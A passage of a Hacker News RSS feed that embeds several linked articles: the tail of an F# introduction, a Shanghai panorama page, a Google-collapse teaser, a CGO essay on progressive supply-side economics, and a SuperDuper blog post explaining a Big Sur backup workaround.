<p>They all share the same single architecture: Elmish. So you can write your code for one and port it to another.</p>

<h2 id="getting-started-and-some-resources">Getting started and some resources</h2>

<p>If you want to get started to F#, the first place you should check out is <a href="https://fsharp.org/">F# Software Foundation</a></p>

<p><img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/fsf2.png" alt="fsharp-foundation"></p>

<p>As you can see FSharp Software Foundation offers mentorship programs periodically, which means you can have a free weekly 1 on 1 session with an experienced F# developer! As of today the program is open for people who want to have an F# mentor or want to be
an F# mentor. You can apply from <a href="https://docs.google.com/forms/d/e/1FAIpQLSdKgZaAcjf7ZxVqBZzyZcBi609BOc0etBnV5XhR6BMihdyYRw/viewform">here</a>.</p>

<p>If you are sold with F# there is one important point to highlight. Do not treat F#, just another language with different syntax especially if you are familiar
with Python, Ruby, JavaScript, C#, etc. You have to embrace functional programming as a paradigm. F# is a functional-first programming language. In other words,
although F# has OOP syntax as well, it mostly makes sense to use F# when you want to get benefit from functional programming concepts. If you try to program
F# the same way you program other imperative languages you won’t get much benefit.</p>

<p>If you are a C# develeoper and you want to start functional programming with F# this is the go-to book:
<em>Disclaimer: I do not know the author nor I am affiliated with the publisher by any way</em></p>

<p><a href="https://www.manning.com/books/functional-programming-in-c-sharp">Functional programming in C#</a></p>

<p>Although the book is mostly about C#, it will show you how painful to do functional programming with C# and only perhaps then you can develop
some love for F#. Having that said it will also help you to understand some more new coming but confusing features of C# 9 like Records and Pattern matching.
If you think  C# records are for immutability, no they are not. They are for Value semantics and <a href="https://www.sitepoint.com/what-is-referential-transparency/#:~:text=In%20functional%20programming%2C%20referential%20transparency,the%20result%20of%20the%20program.">referential transparency</a>.</p>

<p>To try F# right away you may use the following links:</p>

<p>https://try.fsharp.org/</p>

<p>https://fable.io/repl/</p>

<p>https://tryfsharp.fsbolero.io/</p>

<h2 id="syntax">Syntax</h2>

<p>When you are unfamiliar with F# syntax, it might look a bit cryptic. And I have seen some people complained that it is very verbose. On the contrary, I would make a bold claim that F# beats most other languages when it comes to conciseness. You don’t believe me? see it your self (make sure you check all implementations)</p>

<p><a href="https://rosettacode.org/wiki/Category:F_Sharp">F# problems on Rosetta Code</a></p>

<h2 id="a-couple-of-toy-projects-of-mine">A couple of toy projects of mine</h2>

<p>I have developed commercial applications with F#, but as public stuff here are a couple of projects I have built. One is a full blazor/web assembly project:</p>

<p>https://github.com/OnurGumus/FBlazorShop</p>

<p>And the actual app for the 3D bin packing problem, in which items of different volumes must be packed into a finite number of bins or containers each of a fixed given volume in a way that minimizes the number of bins used.</p>

<p>https://github.com/OnurGumus/BinDrake</p>

<p>http://bindrake.com/</p>

<p>Trying and learning F# really requires you to dismiss your prejudices and be patient. But in the end, once you master the functional paradigm,
it makes you sleep better as a developer.</p>


             
            
            
            
                  
         </section>
         
      </div>
   </div></div>]]>
            </description>
            <link>https://onurgumus.github.io/2021/01/31/What-the-F.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25986316</guid>
            <pubDate>Mon, 01 Feb 2021 06:59:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[195 gigapixel 360-degree panorama of Shanghai]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25986212">thread link</a>) | @lelf
<br/>
January 31, 2021 | http://pf.bigpixel.cn/zh-CN/pano/771906131130847232.html | <a href="https://web.archive.org/web/*/http://pf.bigpixel.cn/zh-CN/pano/771906131130847232.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="id_pano_ad"><div></div></div><p>大像素看世界第4期：上海</p><p>陆家嘴是上海的经济脉动中心，也是向世界展示中国经济腾飞的窗口。受上海市新闻办的邀请，大像素团队为其创作上海互联网城市名片。</p><div><p> 最热评论</p><a id="social-comment" target="_blank" href="http://pf.bigpixel.cn/zh-CN/downapp.html"><div><p> 暂无评论 </p></div></a><p><a target="_blank" href="http://pf.bigpixel.cn/zh-CN/downapp.html"> 更多 ...</a></p></div></div></div>]]>
            </description>
            <link>http://pf.bigpixel.cn/zh-CN/pano/771906131130847232.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25986212</guid>
            <pubDate>Mon, 01 Feb 2021 06:37:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This is How Google will Collapse (2017)]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 31 (<a href="https://news.ycombinator.com/item?id=25985843">thread link</a>) | @partingshots
<br/>
January 31, 2021 | https://www.googliath.org/this-is-how-google-will-collapse-by-daniel-colin-james/ | <a href="https://web.archive.org/web/*/https://www.googliath.org/this-is-how-google-will-collapse-by-daniel-colin-james/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<!-- ARTICAL CONTENT -->
                                                        <h2>Reporting from the very near, post-Google future</h2>
<p>Google made almost all its money from ads. It was a booming business — until it wasn’t. Here’s how things looked right before the most spectacular crash the technology industry had ever seen.<br>
The crumbling of Google’s cornerstone</p>
<p>Search was Google’s only unambiguous win, as well as its primary source of revenue, so when Amazon rapidly surpassed Google as the top product search destination, Google’s foundations began to falter. As many noted at the time, the online advertising industry experienced a major shift from search to discovery in the mid-2010s.</p>
<p>While Google protected its monopoly on the dying search advertising market, Facebook — Google’s biggest competitor in the online advertising space — got on the right side of the trend and dominated online advertising with its in-feed native display advertising.</p>
<p><a href="https://hackernoon.com/how-google-collapsed-b6ffa82198ee" target="_blank" rel="noopener">Read the full article here.</a></p>
                                                    </div></div>]]>
            </description>
            <link>https://www.googliath.org/this-is-how-google-will-collapse-by-daniel-colin-james/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25985843</guid>
            <pubDate>Mon, 01 Feb 2021 05:32:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It’s time for a new, progressive supply-side economics]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25984996">thread link</a>) | @apsec112
<br/>
January 31, 2021 | https://www.thecgo.org/news/its-time-for-a-new-progressive-supply-side-economics/ | <a href="https://web.archive.org/web/*/https://www.thecgo.org/news/its-time-for-a-new-progressive-supply-side-economics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article id="post-15709">
<section>
<p><img src="https://www.thecgo.org/wp-content/uploads/2021/01/Benchmark-its-time-for-a-new-Supply-side-economics-1068x396-c-default.jpg" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://www.thecgo.org/wp-content/uploads/2021/01/Benchmark-its-time-for-a-new-Supply-side-economics-1068x396-c-default.jpg">
</p>
<div>
<h2>We need productivity improvements in the sectors that disproportionately affect the&nbsp;poor</h2>
<p>Supply-side economics has a dirty reputation. Since the late 1970s, the term has been associated with “trickle-down” economics: the now-defunct theory that cuts in the highest tax brackets would boost economic productivity so much that government revenue would increase and all of society, even the poor, would benefit.</p>
<p>The trickle-down theory is all but dead, but there is more to the supply side of the economy than taxes. Thousands of government decisions affect real output and economic productivity. A new supply-side economics would recognize that productivity growth is the right target, but it would reject tax policy as the primary means of stimulating productivity. Instead, it would examine how everything government does — from permitting to procurement — could be improved to increase productivity.</p>
<p>In contrast with the old supply-side economics, this approach could be progressive from the outset. Productivity growth has stagnated for decades, with a particularly sharp decline for the last 15 years. What little productivity growth we have experienced has been uneven — there have been many productivity improvements in television manufacturing and few in hospital services, as Mark Perry’s <a href="https://www.aei.org/carpe-diem/chart-of-the-day-or-century-5/" target="_blank" rel="noopener" data-href="https://www.aei.org/carpe-diem/chart-of-the-day-or-century-5/">famous chart</a> shows.</p>
<figure><img src="https://cdn-images-1.medium.com/max/800/0*963226iwV9_Z3HHo" data-image-id="0*963226iwV9_Z3HHo" data-width="1214" data-height="1406" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<p>These productivity changes are not neutral with respect to the distribution of income. Some high-cost items impose an especially large burden on the budgets of the poor. If we could increase productivity growth in particular sectors, we would reduce real income inequality. Doing so would also unambiguously grow the size of the overall economy.</p>
<p>What are the sectors where productivity gains would have the biggest progressive effect? A look at the Bureau of Labor Statistics’s Consumer Expenditure Surveys, particularly its <a href="https://www.bls.gov/cex/2019/combined/decile.pdf" target="_blank" rel="noopener" data-href="https://www.bls.gov/cex/2019/combined/decile.pdf">table on income deciles</a>, can help us figure that out.</p>
<h2>Shelter</h2>
<p>By far, the biggest share of the lowest income decile’s consumer expenditures go to housing, and specifically shelter (as opposed to other household expenses such as household operations, housekeeping supplies, or furnishings that all fall under BLS’s housing category). Much has been made about NIMBYism, zoning reform, and the need to decrease housing costs. This emphasis is completely warranted from a progressive supply-side perspective. The lowest decile spends 25.8 percent of its budget on shelter, whereas the top decile spends 17.7 percent. A decrease in the cost of shelter would, therefore, disproportionately benefit the poorest in America.</p>
<figure><img src="https://cdn-images-1.medium.com/max/800/0*KGzix8fAQ2LagqkT" data-image-id="0*KGzix8fAQ2LagqkT" data-width="1600" data-height="1164" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<p>Progressive supply-siders, therefore, must continue to unite against excessive zoning and NIMBYism. We need to build a lot more housing to drive down its cost. And we must support new and innovative building methods (like Cover’s LEGO-like <a href="https://buildcover.com/product/building-system" target="_blank" rel="noopener" data-href="https://buildcover.com/product/building-system">building system</a>) that leverage economies of scale in construction. A victory on housing productivity would result in hundreds of extra dollars a month in the pockets of the poor.</p>
<p><iframe src="https://player.vimeo.com/video/343493885?title=0&amp;byline=0&amp;portrait=0" width="640" height="360" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><a href="https://vimeo.com/343493885">Cover’s Building System</a></p>
<h2>Energy</h2>
<p>The three lowest income deciles spend between 8.7 and 8.9 percent of their budgets on what the BLS calls “utilities, fuels, and public services.” This category includes energy — natural gas, electricity, and heating oil — as well as telephone service and a catchall “water and other public services.” More than half of the category lies in the three energy items.</p>
<figure><img src="https://cdn-images-1.medium.com/max/800/0*9Kua433F5y6OkWDm" data-image-id="0*9Kua433F5y6OkWDm" data-width="1600" data-height="1164" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<p>We are fortunate in the United States to have achieved energy independence through the shale oil boom. The boom has resulted in ultra-cheap natural gas, which is basically a waste product from the search for petroleum. US electricity prices are a fraction of what they are in Europe. But even so, we have not realized the 1950s-era goal of clean energy too cheap to meter. Instead, we have moderated our per-capita energy consumption, as shown in this chart from J. Storrs Hall’s book, <em>Where’s My Flying Car?</em></p>
<figure><img src="https://cdn-images-1.medium.com/max/800/0*1GRx9e3NBMn9JoaU" data-image-id="0*1GRx9e3NBMn9JoaU" data-width="1600" data-height="878" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<p>The falling cost of wind and solar electricity combined with my favorite energy technology, <a href="https://www.vox.com/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical" target="_blank" rel="noopener" data-href="https://www.vox.com/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">advanced geothermal energy</a>, could unlock significantly cheaper energy costs, as well as zero carbon dioxide emissions. The low cost of clean energy would have ramifications not only for the pocketbooks of the poor but also throughout the entire economy.</p>
<h2>Food at&nbsp;home</h2>
<p>Another major line item in the budgets of the lower income deciles is food. All deciles spend about the same percentage of their budget on food away from home — the numbers vary from 5.1 to 5.9 percent. Where the deciles differ is on food at home. The lowest deciles spend 9.7 percent of their total expenditures on food at home, whereas the top decile spends 5.2 percent.</p>
<figure><img src="https://cdn-images-1.medium.com/max/800/0*_CQyuU-3avch6wTC" data-image-id="0*_CQyuU-3avch6wTC" data-width="1600" data-height="1164" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<p>Food and beverage inflation has increased in the past two decades nearly as much as housing inflation. As the data shows, this budget item hits the poorest the hardest. Through innovation in vertical farming, lab-grown meat, and the energy technologies mentioned in the previous section, we could reduce the cost of groceries and increase the level of nutrition available for any spending level. Cheaper healthy food options could reduce obesity, a condition <a href="https://diabetes.diabetesjournals.org/content/60/11/2667" target="_blank" rel="noopener" data-href="https://diabetes.diabetesjournals.org/content/60/11/2667">disproportionally prevalent</a> among the poor. This food innovation benefits everyone, but it benefits the poor the most.</p>
<h2>Healthcare</h2>
<p>Healthcare is a tricky topic to evaluate from the Consumer Expenditure Surveys, as the surveys only capture costs borne by consumers — their personal portion of the cost of health insurance as well as out-of-pocket medical expenses. It doesn’t include the employer portion of health insurance or the contribution of programs like Medicaid, nor does it include services paid for by insurance. Total <a href="https://www.cms.gov/Research-Statistics-Data-and-Systems/Statistics-Trends-and-Reports/NationalHealthExpendData/NationalHealthAccountsHistorical" target="_blank" rel="noopener" data-href="https://www.cms.gov/Research-Statistics-Data-and-Systems/Statistics-Trends-and-Reports/NationalHealthExpendData/NationalHealthAccountsHistorical">national health expenditures</a>, if we include all of the above, would be 17.7 percent of GDP.</p>
<p>Yet even in personal and out-of-pocket medical expenditures, there is a clear trend suggesting that health innovation would benefit the poor the most. The second income decile spends 11.3 percent of its budget on these health expenses, while the top decile spends 6.6 percent. The first decile may spend less than the second because its household members are younger and healthier — people in the second decile are twice as likely to be elderly than those in the first.</p>
<figure><img src="https://cdn-images-1.medium.com/max/800/0*IkmKcN7Y6D8VxlDU" data-image-id="0*IkmKcN7Y6D8VxlDU" data-width="1600" data-height="1164" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<p>We badly need health innovation to drive down costs. As <a href="https://fortune.com/2020/12/30/anti-aging-research-health-care-spending-biden/" target="_blank" rel="noopener" data-href="https://fortune.com/2020/12/30/anti-aging-research-health-care-spending-biden/">I argued in <em>Fortune</em></a>, research on biological aging could lead to longer healthspans, compressed morbidity, reduced chronic disease prevalence, and lower medical expenditures. Additionally, consumer medical devices could lower the cost of high-quality medical monitoring, replacing the annual physical with continuous observation of health indicators. With better monitoring, serious conditions could be detected earlier, when they are cheaper to address. Other breakthroughs in biology, like mRNA vaccines and computer-simulated protein folding, could lead to quicker and less expensive cures for virtually every disease.</p>
<h2>Putting it all&nbsp;together</h2>
<p>Combining these four elements — shelter, utilities, food at home, and direct healthcare expenditures — adds up to a lot. Together, they make up 52.7 percent of the first decile’s total expenditures and 53.1 percent of the second decile’s. For the top decile they account for only 33.8 percent of expenditures. Innovation in these sectors, then, directly and disproportionately benefits the poorest in America.</p>
<p>A progressive supply-side agenda, therefore, would target productivity growth in the necessities that make up over half the budget of the poor. Through smarter regulation and entrepreneurial policy, we can drive down the cost of these goods and increase the real standard of living at the bottom of the income distribution.</p>
<p>To be sure, a supply-side approach is a complement, not a substitute, for many government transfer programs. Even so, the potential of progressive supply-side policy exceeds that of transfers over the long run. Total annual expenditures for the first income decile average $25,856. A 10 percent across-the-board increase in productivity — less than five years’ economic growth in the 1960s or the late 1990s — would be worth $2,586 per year to these households, twice the average value of direct public assistance as reported in the survey. A progressive approach that targeted productivity improvements specifically to necessities could do even better, as would productivity gains that compounded over a longer period of time. In addition, progressive supply-side policy could “trickle up” to provide gains in the rest of the income distribution, a benefit worth considering.</p>
<p>As necessary as government transfers are, the policy conversation has overrelied on them. Need to stimulate the economy? Write people checks. Have a poverty problem? People won’t be poor if we send them enough checks. Global pandemic? Checks. These demand-side policies have their virtues — they are simple to implement and they often at least partially achieve their goals.</p>
<p>But for true prosperity across the income distribution, we need a more creative supply-side approach. We policy wonks need to do the hard work of finding policies that increase productivity growth, particularly for those goods and services consumed disproportionately at the bottom of the income distribution.</p>
</div>
<p>
CGO scholars and fellows frequently comment on a variety of topics for the popular press. The views expressed therein are those of the authors and do not necessarily reflect the views of the Center for Growth and Opportunity or the views of Utah State University.
</p>
</section>
</article>
</div></div>]]>
            </description>
            <link>https://www.thecgo.org/news/its-time-for-a-new-progressive-supply-side-economics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25984996</guid>
            <pubDate>Mon, 01 Feb 2021 02:49:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[That’s Big Sir to You]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 49 (<a href="https://news.ycombinator.com/item?id=25984970">thread link</a>) | @zdw
<br/>
January 31, 2021 | https://www.shirtpocket.com/blog/index.php/shadedgrey/thats_big_sir_to_you/ | <a href="https://web.archive.org/web/*/https://www.shirtpocket.com/blog/index.php/shadedgrey/thats_big_sir_to_you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Hey, folks. Sorry it's been a while, but it's been a busy time. Let's start with the bad news first.</p>

<h2>Bad news</h2>

<p>As you know, SuperDuper 3.3.1 cannot copy a volume with Big Sur on it. We're currently blocked on some issues I don't have direct control over, and as such I don't have a new version for you that <strong>fully</strong> supports Big Sur, nor a timeframe for when that will be released.</p>

<p>Right now, as many of you know, v3.3.1 <strong>will</strong> work with non-boot volumes, but it <strong>won't</strong> work with volumes that have macOS on them, because it will try to do some of the things that no longer work in macOS 11.</p>

<p>I know that's been a disappointment, but that's where we are with v3.3.1.</p>

<h2>Good news!</h2>

<p>However, after wracking my brain for <strong>far</strong> too long, I've come up with a <strong>workaround</strong> that will let you make the backups you need to save your files, and to supplement your Time Machine backup. And for that, we need to go Back...to the Future!</p>

<h2>Huh?</h2>

<p>Let me try to explain.</p>

<p>In Catalina, as I explain in <a href="https://www.shirtpocket.com/blog/index.php/shadedgrey/comments/breaking_the_tape/">Breaking the Tape</a>, Apple split the startup volume into two parts: the System volume and the Data volume. We did a ton of work that year to support this new setup in a way that was transparent to the user; SuperDuper automatically creates the proper volumes, converts the drives to APFS as needed, etc.</p>

<p>Worked great.</p>

<p>In macOS 10.15.5, though, <a href="https://www.shirtpocket.com/blog/index.php/shadedgrey/comments/black_boxes_and_bugs/">Apple broke 3rd party copy tools</a> in a way that couldn't be worked around without the use of <code>asr</code>, a low-level drive copy tool that has its own issues. They fixed that in 10.15.6...but it was a rather ominous sign for the future.</p>

<p>That ominous sign became terrifying reality in macOS 11. Due to the new Sealed System Volume, use of <code>asr</code> became mandatory if you wanted to make a copy that was bootable. And even <strong>that</strong> didn't work <strong>at all</strong> until <a href="https://www.shirtpocket.com/blog/index.php/shadedgrey/comments/big_sur/">November 5th</a> of last year—just before Big Sur's official release.</p>

<p>Even now, as of the time of this writing, <code>asr</code> won't make a bootable copy of an M1-based Mac.</p>

<p>So, as of Big Sur, 3rd party tools like SuperDuper can no longer make bootable copies on their own. For that, it's <code>asr</code> or nothing.</p>

<p>It is, indeed, <a href="https://mjtsai.com/blog/2007/06/13/a-very-sweet-solution/">a <em>very</em> <strong>sweet solution</strong></a>.</p>

<p>But, 3.3.1 doesn't know that. It tries to do all the special stuff that we had to do for Catalina, and those things no longer work. And so, as you've seen, that copy generates errors or seems to hang right at the start (because it's thrown exceptions that stop the copy).</p>

<h2>Didn't You Say "Good News"?</h2>

<p>I'm getting there.</p>

<p>SuperDuper! 3.3.1's magic was all about dealing with the split startup volume. It built on the APFS support and scheduling fixes we put into the previous version...and added new things for compatibility with Catalina.</p>

<p>But...what if it <strong>didn't</strong> do that? What if SuperDuper was...<strong>stupider</strong>?</p>

<h2>Wonderfully Awful</h2>

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/oUUdW2bTa3Y" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>I've been testing this out for a while in-house. and I've come up with a weird-sounding workaround that...works!</p>

<p>Basically, you can use SuperDuper to copy the Data volume of the volume group. The result contains all <strong>your</strong> data and applications, can be restored in a few different ways...and can even be made bootable.</p>

<blockquote>
  <p>Note that, as I indicated above, M1 Macs <strong>can't readily boot from external drives</strong>. There are things you can do, if you have an external Thunderbolt 3 drive (USB-C isn't sufficient), but even that won't work if the internal drive is dead. Unless things change, bootable backups are basically a thing of the past on M1-based Macs.</p>
</blockquote>

<h2>How?</h2>

<p>It's actually easy. To accomplish this, use an old version of SuperDuper—<a href="https://www.shirtpocket.com/downloads/SuperDuper!+3.2.5.dmg">specifically, v3.2.5</a>—to copy the Data volume, which is shown in the older version!</p>

<p>v3.2.5 is well tested, having been on the market for quite some time, and is reliable. So we don't have to worry about doing a broad beta test of a partially complete new release. It's already tested, and I've been busy doing the additional testing necessary to prove it works on Big Sur.</p>

<p>Again, this will make a copy of the data that you need to preserve <strong>your</strong> stuff, both Applications and Data, while leaving the Sealed System Volume alone.</p>

<p>And it's a valid source for "restore" during a clean install or migration! So restoration is <strong>easy</strong> and <strong>fast</strong> should it become necessary.</p>

<h2>Neat!</h2>

<p>Yeah, I wish I had thought of this earlier.</p>

<p>So, if you're on Big Sur, and you want to copy a startup drive, here's what to do:</p>

<ol>
<li>Make sure you have your license information handy. You can retrieve it from SuperDuper's Register... page should you need to.</li>
<li>Download and install <a href="https://www.shirtpocket.com/downloads/SuperDuper!+3.2.5.dmg">SuperDuper! v3.2.5 from here</a>.</li>
<li>Remove SuperDuper! from the "Full Disk Access" list in the Security &amp; Privacy preference pane and restart your Mac. This is important, and works around an Apple bug triggered by the change of SuperDuper!'s bundle ID.</li>
<li>Run SuperDuper and follow the steps to allow it Full Disk Access.</li>
<li>If your license is missing, re-enter it from your license email. </li>
<li>Turn off "Check for Updates" in our Preferences so we don't nag you about v3.3.1.</li>
<li>Select the "Data" volume in the source pop-up, and a <strong>new</strong> APFS backup volume in the destination pop-up, along with "Backup - all files" (or whatever script you want). If you already have a backup volume, you can use Disk Utility to select and delete <strong>just</strong> the backup System volume, rather than create a new one. After doing this, rename the Data volume to something sensible (remove "- Data"). Note that you may need to repair it with Disk First Aid before it will show up in SuperDuper.</li>
<li>Make your copy as normal, set up your schedule as needed, etc. Your regular Smart Updates will work as expected.</li>
</ol>

<p>To fully restore, it's easiest to boot to recovery, erase the internal drive you want to restore to, <a href="https://support.apple.com/en-us/HT204904">reinstall the OS from Recovery mode</a>, and then, when prompted to restore during the first boot of the fresh copy of macOS, point at the backup. All your data and applications will be brought in automatically.</p>

<blockquote>
  <p>If you want to make the backup bootable and have an Intel Mac, boot to Recovery (Cmd+R during power on) and install Big Sur to the backup drive. You can then start up from the backup. Note, though, that once made bootable, you can no longer copy <strong>to</strong> the backup until you delete the system volume as above. So <strong>don't</strong> do this unless you need to.</p>
</blockquote>

<h2>Forward-Looking Statements</h2>

<p>It seems clear that the future of bootable backups is unclear.</p>

<p>M1 Macs <strong>can't</strong> be copied in a way that makes them bootable. Bare metal recovery on an M1 Mac isn't possible, since they depend on the contents of their internal drive even when booting externally. And the tools required to make bootable copies of Intel Macs are limited, often fail, and produce inscrutable and undocumented diagnostics when they do.</p>

<p>Everything's a tradeoff, and with the M1 Macs, Apple has given us an amazing new platform, while taking away some of the things that made macOS such a joy to work with. And one of those things is bootable backups.</p>

<p>I have <strong>no idea</strong> if this is going to change for the better in whatever the next macOS version brings, and have no insight into Apple's future plans.</p>

<p>But I <a href="https://www.shirtpocket.com/blog/index.php/shadedgrey/comments/practices_make_perfect_backups/">continue to advise multiple backup strategies</a>, including Time Machine (to an APFS volume under Big Sur), SuperDuper! (for a simple copy of your data and applications) and an online backup program (as a last resort).</p>

<p>With that, back to plugging away at a new version.</p>

<p>Thanks for reading, and for using SuperDuper.</p>

</div></div>]]>
            </description>
            <link>https://www.shirtpocket.com/blog/index.php/shadedgrey/thats_big_sir_to_you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25984970</guid>
            <pubDate>Mon, 01 Feb 2021 02:43:34 GMT</pubDate>
        </item>
    </channel>
</rss>
